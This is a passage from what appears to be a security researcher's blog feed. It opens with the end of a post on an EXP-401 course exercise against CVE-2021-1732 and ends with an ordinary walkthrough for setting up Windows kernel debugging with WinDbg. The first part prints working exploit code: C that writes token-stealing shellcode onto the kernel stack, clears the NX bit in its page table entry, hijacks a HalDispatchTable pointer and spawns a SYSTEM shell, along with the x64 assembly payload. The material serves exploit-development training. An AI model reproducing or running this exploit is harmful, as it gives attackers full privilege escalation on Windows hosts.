previously listed token_stealing.asm for the bugcheck.cpp earlier in the post. It’s copied below so you don’t have to scroll up for it. <a href="https://github.com/ApexPredator-InfoSec/forti_shield/blob/main/kstack/token_stealing.asm">token_stealing.asm</a></p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="n">ULONGLONG</span> <span class="n">pte_base</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="o">*</span><span class="n">ppte_base</span><span class="p">;</span>
	<span class="n">_NtWriteVirtualMemory</span> <span class="n">pNtWriteVirtualMemory</span> <span class="o">=</span> <span class="p">(</span><span class="n">_NtWriteVirtualMemory</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandleA</span><span class="p">(</span><span class="s">"ntdll.dll"</span><span class="p">),</span> <span class="s">"NtWriteVirtualMemory"</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">pNtWriteVirtualMemory</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[!] Error while resolving NtWriteVirtualMemory: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
		<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ReadProcessMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">kThread</span> <span class="o">+</span> <span class="mh">0x38</span><span class="p">),</span> <span class="n">read_qword</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">read_bytes</span><span class="p">))</span>
	<span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[!] Error while calling ReadProcessMemory(): %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
	<span class="p">}</span>
	<span class="n">PULONGLONG</span> <span class="n">kStack</span> <span class="o">=</span> <span class="p">(</span><span class="n">PULONGLONG</span><span class="p">)((</span><span class="n">ULONG_PTR</span><span class="o">*</span><span class="p">)</span><span class="n">read_qword</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[+] KSTACK Base Address: %llx </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">*</span><span class="n">kStack</span><span class="p">);</span>

	<span class="n">ULONGLONG</span> <span class="n">kStackB</span> <span class="o">=</span> <span class="p">((</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="o">*</span><span class="n">kStack</span> <span class="o">-</span> <span class="mh">0x100</span><span class="p">);</span>
	<span class="n">ULONGLONG</span><span class="o">*</span> <span class="n">tokensteal</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="o">*</span><span class="p">)</span><span class="n">TokenStealing</span><span class="p">;</span>
	<span class="n">ULONGLONG</span> <span class="n">write_what</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">tokensteal</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
	<span class="n">pNtWriteVirtualMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">kStackB</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">write_what</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="n">write_what</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">tokensteal</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
	<span class="n">pNtWriteVirtualMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">kStackB</span> <span class="o">+</span> <span class="mh">0x08</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">write_what</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="n">write_what</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">tokensteal</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
	<span class="n">pNtWriteVirtualMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">kStackB</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">write_what</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="n">write_what</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">tokensteal</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
	<span class="n">pNtWriteVirtualMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">kStackB</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">write_what</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="n">write_what</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">tokensteal</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
	<span class="n">pNtWriteVirtualMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">kStackB</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">write_what</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="n">write_what</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">tokensteal</span><span class="p">[</span><span class="mi">5</span><span class="p">];</span>
	<span class="n">pNtWriteVirtualMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">kStackB</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">write_what</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="n">write_what</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">tokensteal</span><span class="p">[</span><span class="mi">6</span><span class="p">];</span>
	<span class="n">pNtWriteVirtualMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">kStackB</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">write_what</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="n">write_what</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">tokensteal</span><span class="p">[</span><span class="mi">7</span><span class="p">];</span>
	<span class="n">pNtWriteVirtualMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">kStackB</span> <span class="o">+</span> <span class="mh">0x38</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">write_what</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="n">write_what</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">tokensteal</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
	<span class="n">pNtWriteVirtualMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">kStackB</span> <span class="o">+</span> <span class="mh">0x40</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">write_what</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="n">write_what</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">tokensteal</span><span class="p">[</span><span class="mi">9</span><span class="p">];</span>
	<span class="n">pNtWriteVirtualMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">kStackB</span> <span class="o">+</span> <span class="mh">0x48</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">write_what</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="n">write_what</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">tokensteal</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>
	<span class="n">pNtWriteVirtualMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">kStackB</span> <span class="o">+</span> <span class="mh">0x50</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">write_what</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="n">write_what</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">tokensteal</span><span class="p">[</span><span class="mi">11</span><span class="p">];</span>
	<span class="n">pNtWriteVirtualMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">kStackB</span> <span class="o">+</span> <span class="mh">0x58</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">write_what</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="n">getchar</span><span class="p">();</span>
	<span class="c1">//Flip NX bit on Kstack</span>
	<span class="n">ULONGLONG</span> <span class="n">kStack_pteva</span> <span class="o">=</span> <span class="n">get_pxe_address_64</span><span class="p">(</span><span class="n">kStackB</span><span class="p">,</span> <span class="n">pte_base</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ReadProcessMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">kStack_pteva</span><span class="p">,</span> <span class="n">read_qword</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">read_bytes</span><span class="p">))</span>
	<span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[!] Error while calling ReadProcessMemory(): %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
	<span class="p">}</span>
	<span class="n">PULONGLONG</span> <span class="n">kStack_pteEntry</span> <span class="o">=</span> <span class="p">(</span><span class="n">PULONGLONG</span><span class="p">)((</span><span class="n">ULONG_PTR</span><span class="o">*</span><span class="p">)</span><span class="n">read_qword</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[+] KSTACK PTE Entry: %llx </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">*</span><span class="n">kStack_pteEntry</span><span class="p">);</span>
	<span class="n">getchar</span><span class="p">();</span>
	<span class="n">write_what</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="o">*</span><span class="n">kStack_pteEntry</span> <span class="o">^</span> <span class="p">(</span><span class="mi">1ULL</span> <span class="o">&lt;&lt;</span> <span class="mi">63</span><span class="p">);</span>
	<span class="n">pNtWriteVirtualMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">kStack_pteva</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">write_what</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>

	<span class="n">ULONGLONG</span> <span class="n">HaliQuerySystemInformation</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">ntBase</span> <span class="o">+</span> <span class="mh">0xc00a68</span><span class="p">;</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ReadProcessMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)</span><span class="n">HaliQuerySystemInformation</span><span class="p">,</span> <span class="n">read_qword</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">read_bytes</span><span class="p">))</span>
	<span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[!] Error while calling ReadProcessMemory(): %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
	<span class="p">}</span>
	<span class="n">PULONGLONG</span> <span class="n">orig_HaliQuerySystemInformation</span> <span class="o">=</span> <span class="p">(</span><span class="n">PULONGLONG</span><span class="p">)((</span><span class="n">ULONG_PTR</span><span class="o">*</span><span class="p">)</span><span class="n">read_qword</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[+] Oringial HaliQuerySystemInformation Address: %llx </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">*</span><span class="n">orig_HaliQuerySystemInformation</span><span class="p">);</span>
	<span class="p">((</span><span class="n">PDWORD64</span><span class="p">)((</span><span class="n">DWORD64</span><span class="p">)</span><span class="n">fake_stack</span> <span class="o">+</span> <span class="mh">0x10200</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="o">*</span><span class="n">orig_HaliQuerySystemInformation</span><span class="p">;</span>

	<span class="n">getchar</span><span class="p">();</span>
	<span class="n">write_what</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">kStackB</span><span class="p">;</span>
	<span class="n">pNtWriteVirtualMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">HaliQuerySystemInformation</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">write_what</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="n">_NtQueryIntervalProfile</span> <span class="n">pNtQueryIntervalProfile</span> <span class="o">=</span> <span class="p">(</span><span class="n">_NtQueryIntervalProfile</span><span class="p">)</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandleA</span><span class="p">(</span><span class="s">"ntdll.dll"</span><span class="p">),</span> <span class="s">"NtQueryIntervalProfile"</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">pNtQueryIntervalProfile</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[!] Error while resolving NtQueryIntervalProfile: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
		<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="n">ULONG</span> <span class="n">trash</span><span class="p">;</span>
	<span class="n">pNtQueryIntervalProfile</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">trash</span><span class="p">);</span>
	<span class="n">getchar</span><span class="p">();</span>
	<span class="n">Sleep</span><span class="p">(</span><span class="mi">2000</span><span class="p">);</span>
	<span class="c1">//restore the HalDispatchTable</span>
	<span class="n">write_what</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="o">*</span><span class="n">orig_HaliQuerySystemInformation</span><span class="p">;</span>
	<span class="n">pNtWriteVirtualMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">HaliQuerySystemInformation</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">write_what</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="c1">//restore Previous Mode on the KThread</span>
	<span class="n">memset</span><span class="p">(</span><span class="n">read_qword</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">));</span>
	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ReadProcessMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">kThread</span> <span class="o">+</span> <span class="mh">0x232</span><span class="p">),</span> <span class="n">read_qword</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">read_bytes</span><span class="p">))</span>
	<span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[!] Error while calling ReadProcessMemory(): %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
	<span class="p">}</span>
	<span class="n">PULONGLONG</span> <span class="n">kThreadPM</span> <span class="o">=</span> <span class="p">(</span><span class="n">PULONGLONG</span><span class="p">)((</span><span class="n">ULONG_PTR</span><span class="o">*</span><span class="p">)</span><span class="n">read_qword</span><span class="p">);</span>
	<span class="n">write_what</span> <span class="o">=</span> <span class="p">(</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="o">*</span><span class="n">kThreadPM</span> <span class="o">^</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">0</span><span class="p">;</span>
	<span class="n">pNtWriteVirtualMemory</span><span class="p">(</span><span class="n">GetCurrentProcess</span><span class="p">(),</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">ULONGLONG</span><span class="p">)</span><span class="n">kThread</span> <span class="o">+</span> <span class="mh">0x232</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">write_what</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">ULONGLONG</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
	<span class="n">system</span><span class="p">(</span><span class="s">"start cmd.exe"</span><span class="p">);</span>

	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>

<span class="err">}</span>
</code></pre></div></div>

<pre><code class="language-asm">_TEXT	SEGMENT

TokenStealing PROC
	get_eproc:
	nop
	nop
	nop
	nop
	nop
	push	rax										;save registers
	push	rcx										;
	push	r9										;
	push	r8										;
	xor     rax, rax								;Get the EPROCESS of current Process
	mov     rax, qword ptr gs:[rax+188h]			;
	mov     rax, qword ptr [rax+0B8h]				;
	mov     r8, rax									;
	parse_eproc:
	mov     rax, qword ptr [rax+448h]				;walk the linked process list to find SYSTEM process
	sub     rax, 448h								;
	mov     rcx, qword ptr [rax+440h]				;
	cmp     rcx, 4									;
	jne     parse_eproc								;
	steal_token:
	mov     r9, qword ptr [rax+4B8h]				;copy SYSTEM process token to current process
	mov     qword ptr [r8+4B8h], r9					;
	pop		r8										;restire registers
	pop		r9										;
	pop		rcx										;
	pop		rax										;we are about to overwrite this one but stack allignment is a thing
	mov		rax, qword ptr [0b60f0200h]				;HaliQuerySystemInformation
	jmp		rax
	ret

TokenStealing ENDP

_TEXT	ENDS

End
</code></pre>

<p>And for our hard work we receive a nice SYSTEM command shell.</p>

<p><img src="/assets/images/post2-kstack-success.png" alt="post2-kstack-success" /></p>]]></content><author><name></name></author><category term="posts" /><summary type="html"><![CDATA[I ran in to an issue with triggering a bugcheck AKA the Blue Screen Of Death or BSOD on Windows 10 20H1 while solving an Extra Mile exercise in the EXP-401 course. The challenge was to change the exploit from the course material targeting CVE-2021-1732 from a Data Only attack to Code Execution.]]></summary></entry><entry><title type="html">Windows Kernel Debugging Walk Through</title><link href="https://apexpredator-infosec.github.io/posts/2025/12/01/kernel-debugging-walk-through.html" rel="alternate" type="text/html" title="Windows Kernel Debugging Walk Through" /><published>2025-12-01T13:45:04-05:00</published><updated>2025-12-01T13:45:04-05:00</updated><id>https://apexpredator-infosec.github.io/posts/2025/12/01/kernel-debugging-walk-through</id><content type="html" xml:base="https://apexpredator-infosec.github.io/posts/2025/12/01/kernel-debugging-walk-through.html"><![CDATA[<p>This is a quick walk through on the basics of Windows Kernel debugging. You will need two Windows Virtual Machines (VM) for this scenario. I used two Windows 11 25H2 VMs.</p>

<p>You can use which ever Hyper Visor you prefer. I used Hyper-V because it’s easy to use and allows you to run Virtualization Based Security (VBS) on your host and the VMs at the same time.</p>

<p>You can download the latest version of Windows installer ISO from <a href="https://www.microsoft.com/en-us/software-download/windows11">Microsoft Download</a></p>

<p>I recommend setting up two Network Interface Cards (NIC) per VM. One will be used for debugging the kernel and the other will be used for accessing the internet. If you want a completely isolated environment you could get by with one NIC. The debugging NIC must be the first NIC on the system.</p>

<p>This is a screenshot of my debugger VM settings showing the network setup. The debugging network is on it’s own private Virtual Switch.
<img src="/assets/images/VM_network_config.png" alt="Network_config" /></p>

<p>It is important to ensure that Secure Boot is disabled on the Debugee machine. Secure Boot can be enabled on the Debugger machine.</p>

<p>Set static IPs on the NIC assigned to the debug network. I used 10.10.10.10 for the Debugger machine and 10.10.10.11 for the Debugee machine.
<img src="/assets/images/debugger_ipconfig.png" alt="Debugger ipconfig" /></p>

<p>The Debugger machine needs WinDbg installed. You can download it as part of the Windows Software Development Kit (SDK) downlaoded from <a href="https://developer.microsoft.com/en-us/windows/downloads/windows-sdk/">Windows SDK</a> or you can install WinDbg from a PowerShell terminal with:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winget install Microsoft.WinDbg
</code></pre></div></div>

<p>I also use the Debugger machine as my development platform and install Visual Studio <a href="https://visualstudio.microsoft.com/downloads/">Visual Studio Download</a> and the Windows Driver Kit <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/download-the-wdk">Windows Driver Kit Download</a>. This is optional and not required if you are not doing any development.</p>

<p>You can go ahead and start WinDbg and configure a Kernel Debugging connection listener by clicking File-&gt;Stat Debugging-&gt; Attach to Kernel. Then set a port. You can use the default port 50000 or any other unused UDP port. You will also need a 256-bit authentication key that must be in the form of four 64-bit chunks separated by dots i.e. x.x.x.x. You can use lowercase a-z and 0-9 for each chunk. In my example I use kernel.dbg.lab.2025</p>

<p><img src="/assets/images/kernel_debug_connection1.png" alt="debugger connection 1" />
<img src="/assets/images/kernel_debug_connection2.png" alt="debugger connection 2" />
<img src="/assets/images/Kernel_debug_connection3.png" alt="debugger connection 3" /></p>

<p>You can pre-download symbols (function names, etc.) by opening a command prompt and creating a symbols folder and running the symchk tool. Kernel debugging will be a lot more confusing if you don’t have symbols. As long as you have internet connection on the Debugger machine you can download symbols on the fly, but it saves time when debugging to pre-download them.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkdir symbols

cd "C:\Program Files (x86)\Windows Kits\10\Debuggers\x64"

symchk /r C:\Windows\System32\*.dll /s srv*C:\symbols*https://msdl.microsoft.com/download/symbols

symchk /r C:\Windows\System32\drivers\*.sys /s srv*C:\symbols*https://msdl.microsoft.com/download/symbols
</code></pre></div></div>

<p>Now switch over to the Debugee machine to setup the IP information and configure kernel debugging. I used 10.10.10.11 for the Debugee IP on the debugging network. The following commands on an administrator command prompt will enable network kernel debugging to connect to 10.10.10.10 on UDP port 50000 with key kernel.dbg.lab.2025:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bcdedit /debug on

bcdedit /dbgsettings net hostip:10.10.10.10 port:50000 key:kernel.dbg.lab.2025

bcdedit /set "{dbgsettings} dhcp no"
</code></pre></div></div>
<p><img src="/assets/images/debuggee_enable_debug.png" alt="enable debug" />
<img src="/assets/images/debuggee_debugg_settings.png" alt="debug settings" />
Reboot the Debugee machine and you will see the connection on the Debugger machine.
<img src="/assets/images/debugger_connected.png" alt="debugger connected" />
Click the pause button to break. This will cause the Debugee machine to become unresponsive to any input since you have initiated a break into the kernel. This happens anytime you hit a break point or manually break. Now is a good time to set your symbol path and force a reload of the symbols. The command bar changes from <em>BUSY</em> Debuggee is running… to 0:kd&gt;. You will be able to type commands into the command bar and hit enter.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.sympath srv*C:\symbols*https://msdl.microsoft.com/download/symbols

.reload /f
</code></pre></div></div>
<p><img src="/assets/images/setsymbols.png" alt="set symbols" />
The .reload /f will force a reload of the symbols and attempt to download any missing symbols. Type g in the command bar and hit enter or click the green play button to resume the kernel and allow the Debugee to continue processing.</p>

<p>Here is a table of some of the useful WinDbg commands to use with kernel debugging:</p>

<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">dq address or register</code></td>
      <td>Display qwords at specified address or address in register</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">dd address or register</code></td>
      <td>Display dwords at specified address or address in register</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">db address or register</code></td>
      <td>Display byte at specified address or address in register</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">dqs address or register</code></td>
      <td>Same as dq but also display symbols</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">dds address or register</code></td>
      <td>Same as dd but also display symbols</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">? expression</code></td>
      <td>Perform math operations</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">u address or register</code></td>
      <td>Disassemble code at specified address or address in register</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">.formats data</code></td>
      <td>Display the data in several different useful formats. Helps with converting hex to binary or decimal</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">!process blank or 0 0 process_name</code></td>
      <td>Search for a process or display information about current process</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">.process /i EPROCESS address</code></td>
      <td>Interact with the specified process</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">bp address</code></td>
      <td>Set a breakpoint at specified address, you can use symbols instead of address</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">bu address</code></td>
      <td>Set an unresolved breakpoint. Resolves once symbols are loaded</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">ba e1 /p process address</code></td>
      <td>Set a hardware breakpoint on execution of a specified address from within a specified process. You can change <code class="language-plaintext highlighter-rouge">e</code> to <code class="language-plaintext highlighter-rouge">r</code> or <code class="language-plaintext highlighter-rouge">w</code> for read/write</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">bl</code></td>
      <td>List breakpoints</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">bc * or number</code></td>
      <td>Clear or delete all breakpoints or specified breakpoint by number retrieved with <code class="language-plaintext highlighter-rouge">bl</code></td>
    </tr>
    <tr>
